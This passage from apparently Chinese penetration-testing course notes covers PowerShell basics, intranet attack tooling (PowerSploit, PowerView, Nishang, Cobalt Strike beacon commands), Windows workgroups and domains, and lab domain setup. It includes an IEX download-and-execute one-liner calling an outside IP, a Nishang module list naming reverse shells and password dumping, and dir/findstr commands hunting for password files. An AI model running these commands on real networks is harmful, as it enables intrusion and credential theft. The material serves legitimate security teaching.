alt="image-20221230133713788"></p><h3 id="3、【布局】设置窗口的缓冲区、窗口的大小、窗口起始坐"><a href="#3、【布局】设置窗口的缓冲区、窗口的大小、窗口起始坐" class="headerlink" title="3、【布局】设置窗口的缓冲区、窗口的大小、窗口起始坐"></a>3、【布局】设置窗口的缓冲区、窗口的大小、窗口起始坐</h3><p><img src="assets/image-20221230133743360.png" alt="image-20221230133743360"></p><h3 id="4、【颜色】设置屏幕和对话框的背景色和前景色。"><a href="#4、【颜色】设置屏幕和对话框的背景色和前景色。" class="headerlink" title="4、【颜色】设置屏幕和对话框的背景色和前景色。"></a>4、【颜色】设置屏幕和对话框的背景色和前景色。</h3><p><img src="assets/image-20221230133804080.png" alt="image-20221230133804080"></p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><table><thead><tr><th>ALT+F7</th><th>清除命令的历史记录</th></tr></thead><tbody><tr><td>PgUp PgDn</td><td>显示当前会话的第一个命令和最后一个命令</td></tr><tr><td>Enter</td><td>执行当前命令</td></tr><tr><td>End</td><td>将光标移至当前命令的末尾</td></tr><tr><td>Del</td><td>从右开始删除输入的命令字符</td></tr><tr><td>Esc</td><td>清空当前命令行</td></tr><tr><td>F2</td><td>自动补充历史命令至指定字</td></tr><tr><td>F4</td><td>删除命令行至光标右边指定字符处</td></tr><tr><td>F7</td><td>对话框显示命令行历史记录</td></tr><tr><td>F8</td><td>检索包含指定字符的命令行历史记录</td></tr><tr><td>F9</td><td>根据命令行的历史记录编号选择命令，历史记录编号可以通过F7查看</td></tr><tr><td>左/右方向键</td><td>左右移动光标</td></tr><tr><td>上/下方向键</td><td>切换命令行的历史记录</td></tr><tr><td>Home</td><td>光标移至命令行最左端</td></tr><tr><td>Backspace</td><td>从右删除命令行字符</td></tr><tr><td>Ctrl+C</td><td>取消正在执行的命令</td></tr><tr><td>Ctrl+左/右方向键</td><td>在单词之间移动光标</td></tr><tr><td>Ctrl+Home</td><td>删除光标最左端的所有字符</td></tr><tr><td>Tab</td><td>自动补齐命令或者文件名</td></tr></tbody></table><h2 id="管道和重定向"><a href="#管道和重定向" class="headerlink" title="管道和重定向"></a>管道和重定向</h2><p>例如通过ls获取当前目录的所有文件信息，然后通过Sort -Descending对文件信息按照Name降序排列，最后将排序好的文件的Name和Mode格式化成Table输出。</p><pre class="line-numbers language-none"><code class="language-none">ls | sort -Descending Name | Format-Table Name,Mode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230134307288.png" alt="image-20221230134307288"></p><p>把命令的输出保存到文件中，<code>&gt;</code>为覆盖，<code>&gt;&gt;</code>追加</p><pre class="line-numbers language-none"><code class="language-none">"powershell routing" &gt;test.txtget-content ./test.txt"powershell routing" &gt;&gt;test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221230134353687.png" alt="image-20221230134353687"></p><h2 id="执行外部命令"><a href="#执行外部命令" class="headerlink" title="执行外部命令"></a>执行外部命令</h2><p>Powershell 能够像CMD一样很好的执行外部命令 </p><p>通过<code>ipconfig</code>查看自己的网络配置</p><p><img src="assets/image-20221230134446530.png" alt="image-20221230134446530"></p><p>通过<code>netstat</code>查看网络端口状态</p><p><img src="assets/image-20221230134504182.png" alt="image-20221230134504182"></p><p>启动<code>cmd</code>控制台</p><p><img src="assets/image-20221230134522722.png" alt="image-20221230134522722"></p><p>Cmd.exe 通过 /c 来接收命令参数，在Cmd中help可以查看可用的命令，所以可以通过<code>Cmd /c help</code> 查找可用的Cmd控制台命令</p><p><img src="assets/image-20221230134554297.png" alt="image-20221230134554297"></p><h2 id="执行内部命令"><a href="#执行内部命令" class="headerlink" title="执行内部命令"></a>执行内部命令</h2><p>每个命令有一个动词和名词组成，命令的作用一目了然</p><table><thead><tr><th>Name</th></tr></thead><tbody><tr><td>Add-Computer</td></tr><tr><td>Add-Content</td></tr><tr><td>Add-History</td></tr><tr><td>Add-Member</td></tr><tr><td>Add-PSSnapin</td></tr><tr><td>Add-Type</td></tr><tr><td>Checkpoint-Computer</td></tr><tr><td>Clear-Content</td></tr><tr><td>Clear-EventLog</td></tr><tr><td>Clear-History</td></tr><tr><td>Clear-Item</td></tr><tr><td>Clear-ItemProperty</td></tr><tr><td>Clear-Variable</td></tr><tr><td>Compare-Object</td></tr><tr><td>Complete-Transaction</td></tr><tr><td>Connect-WSMan</td></tr><tr><td>ConvertFrom-Csv</td></tr><tr><td>ConvertFrom-SecureString</td></tr><tr><td>ConvertFrom-StringData</td></tr><tr><td>Convert-Path</td></tr><tr><td>ConvertTo-Csv</td></tr><tr><td>ConvertTo-Html</td></tr><tr><td>ConvertTo-SecureString</td></tr><tr><td>ConvertTo-Xml</td></tr><tr><td>Copy-Item</td></tr><tr><td>Copy-ItemProperty</td></tr><tr><td>Debug-Process</td></tr><tr><td>Disable-ComputerRestore</td></tr><tr><td>Disable-PSBreakpoint</td></tr><tr><td>Disable-PSSessionConfiguration</td></tr><tr><td>Disable-WSManCredSSP</td></tr><tr><td>Disconnect-WSMan</td></tr><tr><td>Disconnect-WSMan</td></tr><tr><td>Enable-ComputerRestore</td></tr><tr><td>Enable-PSBreakpoint</td></tr><tr><td>Enable-PSRemoting</td></tr><tr><td>Enable-PSSessionConfiguration</td></tr><tr><td>Enable-WSManCredSSP</td></tr><tr><td>Enter-PSSession</td></tr><tr><td>Exit-PSSession</td></tr><tr><td>Export-Alias</td></tr><tr><td>Export-Clixml</td></tr><tr><td>Export-Console</td></tr><tr><td>Export-Counter</td></tr><tr><td>Export-Csv</td></tr><tr><td>Export-FormatData</td></tr><tr><td>Export-ModuleMember</td></tr><tr><td>Export-PSSession</td></tr><tr><td>ForEach-Object</td></tr><tr><td>Format-Custom</td></tr><tr><td>Format-List</td></tr><tr><td>Format-Table</td></tr><tr><td>Format-Wide</td></tr><tr><td>Get-Acl</td></tr><tr><td>Get-Alias</td></tr><tr><td>Get-AuthenticodeSignature</td></tr><tr><td>Get-ChildItem</td></tr><tr><td>Get-Command</td></tr><tr><td>Get-ComputerRestorePoint</td></tr><tr><td>Get-Content</td></tr><tr><td>Get-Counter</td></tr><tr><td>Get-Credential</td></tr><tr><td>Get-Culture</td></tr><tr><td>Get-Date</td></tr><tr><td>Get-Event</td></tr><tr><td>Get-EventLog</td></tr><tr><td>Get-EventSubscriber</td></tr><tr><td>Get-ExecutionPolicy</td></tr><tr><td>Get-FormatData</td></tr><tr><td>Get-Help</td></tr><tr><td>Get-History</td></tr><tr><td>Get-Host</td></tr><tr><td>Get-HotFix</td></tr><tr><td>Get-Item</td></tr><tr><td>Get-ItemProperty</td></tr><tr><td>Get-Job</td></tr><tr><td>Get-Location</td></tr><tr><td>Get-Member</td></tr><tr><td>Get-Module</td></tr><tr><td>Get-PfxCertificate</td></tr><tr><td>Get-Process</td></tr><tr><td>Get-PSBreakpoint</td></tr><tr><td>Get-PSCallStack</td></tr><tr><td>Get-PSDrive</td></tr><tr><td>Get-PSProvider</td></tr><tr><td>Get-PSSession</td></tr><tr><td>Get-PSSessionConfiguration</td></tr><tr><td>Get-PSSnapin</td></tr><tr><td>Get-Random</td></tr><tr><td>Get-Service</td></tr><tr><td>Get-TraceSource</td></tr><tr><td>Get-Transaction</td></tr><tr><td>Get-UICulture</td></tr><tr><td>Get-Unique</td></tr><tr><td>Get-Variable</td></tr><tr><td>Get-WinEvent</td></tr><tr><td>lp Get-WmiObject</td></tr><tr><td>Get-WSManCredSSP</td></tr><tr><td>……</td></tr></tbody></table><h2 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h2><p>Powershell一般初始化情况下都会禁止脚本执行。脚本能否执行取决于Powershell的执行策略</p><pre class="line-numbers language-none"><code class="language-none">Get-ExecutionPolicy 查看权限Unrestricted:权限最高，可以不受限制执行任何脚本。Default:为Powershell默认的策略：Restricted，不允许任何脚本执行。AllSigned：所有脚本都必须经过签名才能在运行。RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改变运行策略</p><pre class="line-numbers language-none"><code class="language-none">Set-ExecutionPolicy Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221231143303870.png" alt="image-20221231143303870"></p><p>编写一个1.ps1脚本内容为</p><pre class="line-numbers language-none"><code class="language-none">netstat -ano<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221231143329489.png" alt="image-20221231143329489"></p><h1 id="内网渗透PowerShell脚本"><a href="#内网渗透PowerShell脚本" class="headerlink" title="内网渗透PowerShell脚本"></a>内网渗透PowerShell脚本</h1><h2 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h2><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗 透中的信息侦察、权限提升、权限维持。</p><p> Powershell的优点: </p><ol><li><p>代码运行在内存中可以不去接触磁盘 </p></li><li><p>从另一个系统中下载代码并执行 </p></li><li><p>很多安全产品并不能监测到powershell的活动 </p></li><li><p>cmd.exe通常被阻止运行，但是powershell不会</p></li></ol><pre class="line-numbers language-none"><code class="language-none">AntivirusBypass：发现杀毒软件的查杀特征。CodeExecution：在目标主机上执行代码。Exfiltration：目标主机上的信息搜集工具。Mayhem：蓝屏等破坏性脚本。 Persistence：后面脚本(持久性控制)。 Recon：以目标主机为跳板进行内网信息侦察。ScriptModification：在目标主机上创建或修改脚本。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>powerview也是一款非常的powershell脚本工具，用于域内信息的收集。他集成在在 PowerSploitmaster\Recon目录下。 </p><p>使用方式三种方式： </p><h3 id="本地执行："><a href="#本地执行：" class="headerlink" title="本地执行："></a>本地执行：</h3><pre class="line-numbers language-none"><code class="language-none">shell powershell.exe -exec bypass -command "&amp; { import-module C:\Users\Administrator\Desktop\PowerView.ps1;Get-NetShare}"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221231143532893.png" alt="image-20221231143532893"></p><h3 id="远程执行："><a href="#远程执行：" class="headerlink" title="远程执行："></a>远程执行：</h3><p>python 开启http 服务 </p><p><code>python -m http.server 8080</code></p><pre class="line-numbers language-none"><code class="language-none">shell powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://118.178.134.226:8080/PowerView.ps1');import-module .\PowerView.ps1-NetShare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221231143907788.png" alt="image-20221231143907788"></p><h3 id="CS自带命令"><a href="#CS自带命令" class="headerlink" title="CS自带命令"></a>CS自带命令</h3><pre class="line-numbers language-none"><code class="language-none">beacon&gt; powershell-import //导入各种powershell脚本beacon&gt;powershell posershell脚本名 //执行脚本beacon&gt; powershell Check-VM //执行命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221231143930818.png" alt="image-20221231143930818"></p><table><thead><tr><th>Get-NetDomain</th><th>获取当前用户所在的域名称</th></tr></thead><tbody><tr><td>Get-NetUser</td><td>返回所有用户详细信息</td></tr><tr><td>Get-NetDomainController</td><td>获取所有域控制器</td></tr><tr><td>Get-NetComputer</td><td>获取所有域内机器详细信息</td></tr><tr><td>Get-NetOU</td><td>获取域中OU信息</td></tr><tr><td>Get-NetGroup</td><td>获取所有域内组和组成员信息</td></tr><tr><td>Get-NetFileServer</td><td>根据SPN获取当前域使用的文件服务器</td></tr><tr><td>Get-NetShare</td><td>获取当前域内所有网络共享</td></tr><tr><td>Get-NetSession</td><td>获取在指定服务器存在的Session信息</td></tr><tr><td>Get-NetRDPSession</td><td>获取在指定服务器存在的远程连接信息</td></tr><tr><td>Get-NetProcess</td><td>获取远程主机的进程信息</td></tr><tr><td>Get-UserEvent</td><td>获取指定用户日志信息</td></tr><tr><td>Get-ADObject</td><td>获取活动目录的对象信息</td></tr><tr><td>Get-NetGPO</td><td>获取域所有组策略对象</td></tr><tr><td>Get-DomainPolicy</td><td>获取域默认或域控制器策略</td></tr><tr><td>Invoke-UserHunter</td><td>搜索网络中域管理员正在使用的主机</td></tr><tr><td>Invoke-ProcessHunter</td><td>查找域内所有机器进程用于找到某特定用户</td></tr><tr><td>Invoke-UserEventHunter</td><td>根据用户日志获取某域用户登陆过哪些域机器</td></tr></tbody></table><h2 id="Nishang-1"><a href="#Nishang-1" class="headerlink" title="Nishang"></a>Nishang</h2><p>Nishang是一款针对PowerShell的渗透工具。说到渗透工具，那自然便是老外开发的东西。国人开 发的东西，也不是不行，只不过不被认可罢了。不管是谁开发的，既然跟渗透有关系，那自然是对我 们有帮助的，学习就好。来源什么的都不重要。总之，nishang也是一款不可多得的好工具。非常的好用</p><p><img src="assets/image-20221231144401322.png"></p><h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>查看可用的模块</p><p>shell powershell import</p><pre class="line-numbers language-none"><code class="language-none">shell powershell Import-Module .\nishang\nishang.psm1;Get-Command -Module nishang<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221231144434633.png" alt="image-20221231144434633"></p><pre class="line-numbers language-none"><code class="language-none">Check-VM 检测该主机是不是虚拟机Invoke-CredentialsPhish 欺骗用户，让用户输入密码Get-WLAN-Keys wifi 信息Invoke-Mimikatz 抓密码Get-PassHashes 获取hashGet-PassHints 获取用户的密码提示信息Invoke-PowerShellTcp 反弹shellInvoke-PsUACme 绕过UACRemove-Update 删除补丁Get-Information 本机信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h3><pre class="line-numbers language-none"><code class="language-none">powershell-import nishang\nishang.psm1powershell 命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="敏感数据定位"><a href="#敏感数据定位" class="headerlink" title="敏感数据定位"></a>敏感数据定位</h1><p>内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据 等。可以说，价值较高的数据基本都在内网中。 </p><h2 id="资料、数据、文件的定位流程："><a href="#资料、数据、文件的定位流程：" class="headerlink" title="资料、数据、文件的定位流程："></a>资料、数据、文件的定位流程：</h2><pre class="line-numbers language-none"><code class="language-none">定位内部人事组织结构在内部人事组织结构中寻找需要监视的人员定位相关人员的机器视相关人员存放文档的位置列出存放文档的服务器的目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="重点核心业务机器"><a href="#重点核心业务机器" class="headerlink" title="重点核心业务机器"></a>重点核心业务机器</h2><pre class="line-numbers language-none"><code class="language-none">高级管理人员 系统管理人员 财务/人事/业务人员的个人计算机产品管理系统服务器办公系统服务器财务应用系统服务器核心产品源码服务器（SVN/GIT服务器）数据库服务器文件服务器，共享服务器电子邮件服务器网站监控系统服务器信息安全监控服务器生产工厂服务器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="敏感信息和敏感文件"><a href="#敏感信息和敏感文件" class="headerlink" title="敏感信息和敏感文件"></a>敏感信息和敏感文件</h2><pre class="line-numbers language-none"><code class="language-none">站点源码备份文件，数据库备份文件等等游览器保存的密码和游览器的cookie其他用户会话，3389和ipc$连接记录，回收站中的信息等等Windows的无线密码网络内部的各种账号密码，包含电子邮箱，V**，FTP等等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在内网中,我们一定要知道自己拿下的机器的人员的职位（职位高的人在内网中权限也高，计算机中 的敏感信息也多，还有一种就是特殊职位的人员，例如上面说的，一般都有一些与职位相关的敏感信 息。）还有就是拿下一台机器后要先维权，权限稳了再收集信息，信息收集一定要全面仔细，信息收 集完了再搞内网。往目标主机中传工具用完就删。翻文件的话，可以使用一些搜索命令来快速寻找。</p><pre class="line-numbers language-none"><code class="language-none">1.指定目录下搜集各类敏感文件dir /a /s /b d:\"*.txt"dir /a /s /b C:\"*.xlsx"dir /a /s /b d:\"*.md"dir /a /s /b d:\"*.sql"dir /a /s /b d:\"*.pdf"dir /a /s /b d:\"*.docx"dir /a /s /b d:\"*.doc"dir /a /s /b d:\"*conf*"dir /a /s /b d:\"*bak*"dir /a /s /b d:\"*pwd*"dir /a /s /b d:\"*pass*"dir /a /s /b d:\"*login*"dir /a /s /b d:\"*user*"2.指定目录下的文件中搜集各种账号密码findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-1-zhang-nei-wang-shen-tou-ji-chu/di-1-zhang-nei-wang-shen-tou-ji-chu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-1-zhang-nei-wang-shen-tou-ji-chu/di-1-zhang-nei-wang-shen-tou-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透介绍"><a href="#内网渗透介绍" class="headerlink" title="内网渗透介绍"></a>内网渗透介绍</h1><h2 id="攻击流程讲解"><a href="#攻击流程讲解" class="headerlink" title="攻击流程讲解"></a>攻击流程讲解</h2><p><img src="assets/image-20221226154551665.png" alt="image-20221226154551665"></p><h2 id="内网介绍"><a href="#内网介绍" class="headerlink" title="内网介绍"></a>内网介绍</h2><p>内网也指<strong>局域网</strong>，是指在某一区域内由多台计算机互连而成的计算机组，组网范围通常在数千米以内。</p><p>在局域网中可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等。</p><p>内网是封闭的，可以由办公室内的两台计算机组成，也可以由一个公司内的大量计算机组成。</p><p><img src="assets/image-20221226161350556.png" alt="image-20221226161350556"></p><h1 id="工作组介绍"><a href="#工作组介绍" class="headerlink" title="工作组介绍"></a>工作组介绍</h1><h2 id="1、工作组的介绍"><a href="#1、工作组的介绍" class="headerlink" title="1、工作组的介绍"></a>1、工作组的介绍</h2><p>在一个大型单位里,可能有成百上千台计算机互相连接组成局域网,它们都会列在”网络”(网上邻居) 内。如果不对这些计算机进行分组,网络的混乱程度是可想而知的 为了解决这一问题,产生了工作组(  Work Group)这个概念。将不同的计算机按功能(或部 门)分别列入不同的工作组,例如技术部的计算 机都列入”技术部”工作组、行政部的计算机都 列入”行政部”工作组。要想访问某个部门的资源,只要 在”网络”里双击该部门的工作组名 就可以看到该部门的所有计算机了。相比不分组的情况,这样的情 况有序得多(尤其对大型局域 网来说)。</p><p>工作组如图</p><p><img src="assets/image-20221226162136569.png" alt="image-20221226162136569"></p><h2 id="2、加入工作组"><a href="#2、加入工作组" class="headerlink" title="2、加入工作组"></a>2、加入工作组</h2><p>加入工作组:加入工作组的方法很简单。右击桌面上的”计算机”图标,在弹出的快捷菜单中选择”属性” 选项,然后依次单击”更改设置”和”更改”按钮,在”计算机名”输入框中输入计算机的 名称,在”工作组”输 入框中输入想要加入的工作组的名称</p><p><img src="assets/image-20221226162158923.png" alt="image-20221226162158923"></p><h2 id="3、创建工作组"><a href="#3、创建工作组" class="headerlink" title="3、创建工作组"></a>3、创建工作组</h2><p>创建工作组:如果输入的工作组的名称在网络中不存在,就相当于新建了一个工作组(当然,暂时只有当 前这台计算机在该工作组内)。单击”确定”按钮, Windows会提示需要重新启动。在重新启动 之后进 入”网络”,就可以看到所加入的工作组的成员了。当然,也可以退出工作组(只要修改工作组的名称即 可)</p><h2 id="4、退出工作组"><a href="#4、退出工作组" class="headerlink" title="4、退出工作组"></a>4、退出工作组</h2><p>只要将工作组名称改动即可。不过在网上别人照样可以访问你的共享资源。你也可以随便加入同一网 络上的任何其它工作组。“工作组”就像一个可以自由进入和退出的“社团”，方便同一组的计算机 互相访问。</p><h2 id="5、访问工作组"><a href="#5、访问工作组" class="headerlink" title="5、访问工作组"></a>5、访问工作组</h2><p>文件–&gt;网络，就可以查看到我们工作组中的其他计算机了，当你要访问某台计算机时，点击它，然 后输入该主机的用户名和密码即可看到该主机共享的文件夹。</p><h2 id="6、工作组优缺点"><a href="#6、工作组优缺点" class="headerlink" title="6、工作组优缺点"></a>6、工作组优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li>方便管理和维护 </li><li>资源分配方便和灵活</li></ol><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol><li>缺乏集中管理与控制的机制 </li><li>没有集中的统一帐户管理 </li><li>只适合小规模用户的使用</li></ol><h1 id="域介绍"><a href="#域介绍" class="headerlink" title="域介绍"></a>域介绍</h1><h2 id="域的介绍"><a href="#域的介绍" class="headerlink" title="域的介绍"></a>域的介绍</h2><p>Windows域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位 于称为<strong>域控制器</strong>的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进 行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资 源的访问权限。 </p><p>域 ( Domain)是一个有安全边界的计算机集合(安全边界的意思是,在两个域中,一个域中 的用户无法 访问另一个域中的资源)可以简单地把域理解成升级版的工作组。与工作组相比,域 的安全管理控制机 制更加严格。用户要想访问域内的资源,必须以合法的身份登录域,而用户对域内的资源拥有什么样的 权限,还取决于用户在域内的身份。</p><p>域控制器( Domain Controller,DC)是域中的一台类似管理服务器的计算机 </p><p>域控制器中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当计算 机连接 到域时,域控制器首先要鉴别这台计算机是否属于这个域,以及用户使用的登录账号是否存在、密码是 否正确。如果以上信息有一项不正确,域控制器就会拒绝这个用户通过这台计算机登录。如果用户不 能登录,就不能访问服务器中的资源。 </p><p>域控制器是整个域的通信枢纽,所有的权限身份验证都在域控制器上进行,也就是说,域内 所有用来验 证身份的账号和密码散列值都保存在域控制器中</p><h2 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h2><p>通常,在一个地理位置固定的小公司里,建立一个域就可以满足需求。在一个域内,一般要 有至少两台 域服务器,一台作为DC,另一台作为备份DC。</p><p><img src="assets/image-20221226162526938.png" alt="image-20221226162526938"></p><h2 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h2><p>出于管理及其他需求,需要在网络中划分多个域。第一个域称为父域,各分部的域称为该域的子域。例 如 大公司的各个分公司位于不同的地点,就需要使用父域及子域。如果把不同 地点的分公司放在同一 个域内,那么它们之间在信息交互(包括同步、复制等)上花费的时间就 会比较长,占用的带宽也会比较 大(在同一个域内,信息交互的条目是很多的,而且不会压缩; 在不同的域之间,信息交互的条日相对较少, 而且可以压缩)。这样处理有一个好处,就是分公司 可以通过自己的域来管理自己的资源。还有一种情 况是出于安全策略的考虑(每个域都有自己的 安全策略)例如,一个公司的财务部希望使用特定的安全 策略(包括账号密码策略等)、那么可 以将财务部作为一个子域来单独管理</p><h2 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h2><p>域树(Tree)是多个域通过建立信任关系组成的集合。一个域管理员只能管理本域,不能访问 或者管理 其他域。如果两个域之间需要互相访问,则需要建立信任关系，信任关系是连接不同域的桥梁。域树 内的父域与子域,不但可以按照需要互相管理、还可以跨网络分配文 件和打印机等设备及资源,从而在 不同的域之间实现网络资源的共享与管理、通信及数据传输。 在一个域树中,父域可以包含多个子域。子域是相对父域来说的,指的是域名中的每一个段。 各子域之 间用点号隔开,一个”.”代表一个层次。放在域名最后的子域称为最高级子域或一级 域,它前面的子域称 为二级域</p><p><img src="assets/image-20221226162746782.png" alt="image-20221226162746782"></p><h2 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h2><p>域森林( Forest)是指多个域树通过建立信任关系组成的集合。例如,在一个公司兼并场景中 某公司使 用域树 abc. com,被兼并的公司本来有自己的域树 abc. net,域树abc.net无法挂在域树abc.com下。 所以,域树abc.com与域树 abc. net之间需要通过建立信任关系来构成域森林。通过域树之间的信任 关系,可以管理和使用整个域森林中的资源,并保留被兼并公司自身原有的特性,如图所示。</p><p><img src="assets/image-20221226162819382.png" alt="image-20221226162819382"></p><h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2><p>域名服务器( Domain Name Server,DNs)是指用于实现域名( Domain Name)和与之相对的IP地址(  IP Address)转换的服务器。从对域树的介绍中可以看出,域树中的域名和DNS域名非常相似。而实际 上,因为域中的计算机是使用DNS来定位域控制器、服务器及其他计算机、网络服务的,所以域的名字 就是DNS域的名字。在内网渗透测试中,大都是通过寻找DNS服务器 来确定域控制器的位置的(DNS 服务器和域控制器通常配置在同一机器上）</p><h1 id="域环境搭建"><a href="#域环境搭建" class="headerlink" title="域环境搭建"></a>域环境搭建</h1><h2 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h2><p>在学习内网渗透测试时,需要构建一个内网环境并搭建攻击主机,通过具体操作理解漏洞的工作原理,从 而采取相应的防范措施。一个完整的内网环境,需要各种应用程序、操作系统和网 络设备,可能比较复 杂。我们只需要搭建其中的核心部分,也就是Linux服务器和 Windows服务 器。在本节中,将详细讲 解如何在 Windows平台上搭建域环境</p><h2 id="域环境介绍"><a href="#域环境介绍" class="headerlink" title="域环境介绍"></a>域环境介绍</h2><p>通常所说的内网渗透测试,很大程度上就是域渗透测试。搭建域渗透测试环境,在 Windows的活动目 录环境下进行一系列操作,掌握其操作方法和运行机制,对内网的安全维护有很大的帮 助。常见的域环 境是使用 Windows server2012R2、Windows7或者 Windows Server2003操作系 统搭建的  Windows域环境。 在下面的实验中,将创建一个域环境。配置一台 WindowsServer2012R2服务器,将其升级为域控制 器,然后将 Windows Server2008R2计算机和 Windows7、Windows Server2003计算机加入该 域。四台机器</p><table><thead><tr><th>机器名称</th><th>机器IP</th></tr></thead><tbody><tr><td>WindowsServer 2012 R2（域控）</td><td>192.168.41.10</td></tr><tr><td>WindowsServer 2008 R2（域内主机）</td><td>192.168.41.20</td></tr><tr><td>WindowsServer 2003 R2（域内主机）</td><td>192.168.41.30</td></tr></tbody></table><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="1、设置服务器"><a href="#1、设置服务器" class="headerlink" title="1、设置服务器"></a>1、设置服务器</h3><p>在虚拟机中安装 Windowsserver2012R2操作系统,设置其P地址为192.168.41.10子网掩码为 255252550,DNS指向本机IP地址。</p><p><img src="assets/image-20221226163117277.png" alt="image-20221226163117277"></p><h2 id="2、更改计算机名"><a href="#2、更改计算机名" class="headerlink" title="2、更改计算机名"></a>2、更改计算机名</h2><p>使用本地管理员账户登录,将计算机名改为”DC”(可以随意取名),如图所示。在将本机升级为域控制器 后,机器全名会自动变成”DC.xxx.com”。更改后,需要重启服务器</p><p><img src="assets/image-20221226163148785.png" alt="image-20221226163148785"></p><h2 id="3、安装域控制器和DNS服务"><a href="#3、安装域控制器和DNS服务" class="headerlink" title="3、安装域控制器和DNS服务"></a>3、安装域控制器和DNS服务</h2><p>接下来,在 Windows server2012R2服务器上安装域控制器和DNS服务。登录  WindowsServer2012R2服务器,可以看到”服务器管理器”窗口,如图所示</p><p><img src="assets/image-20221226163232623.png" alt="image-20221226163232623"></p><p>单击【添加角色和功能】选项,进入添加角色和功能向导界面。在【开始之前】部分, 本 保持默认设 置。单击下一步按钮,进入【安装类型】部分,选择基于角色或者基于功能的 安装选项。单击下一步按 钮,进入【服务器选择】部分。目前,在服务器池中只有当前这 台机器,保持默认设置。单击下一步按 钮,在【服务器角色】部分勾选【 Active Directory域 服务】和【DNS服务器】复选框</p><p><img src="assets/image-20221226163254859.png" alt="image-20221226163254859"></p><p>在”功能”界面保持默认设置,单击”下一步”按钮,进人”确认”部分。确认需要安装的组件,勾选”如果需 要,自动重新启动目标服务器”复选框,,然后单击”安装” 按钮</p><h2 id="4、升级服务器"><a href="#4、升级服务器" class="headerlink" title="4、升级服务器"></a>4、升级服务器</h2><p>安装 Active Directory域服务后,需要将此服务器提升为域控制器。单击”将此服务器提升为域控制 器”选项(如果不慎单击了”关闭”按钮,可以打开”服务器管理器”界面进行操作),在界面右上角可以看到 一个中间有”!”的三角形按钮。单击该按钮,如图所示。</p><p><img src="assets/image-20221226163326941.png" alt="image-20221226163326941"></p><p>接着,进人” ActiveDirectory域服务配置向导”界面,在”部署配置”部分单击选中”添加新林(F)”单选按 钮,然后输入根域名”hack.com”(必须使用合DNS命名约定的根域名)</p><p><img src="assets/image-20221226163342181.png" 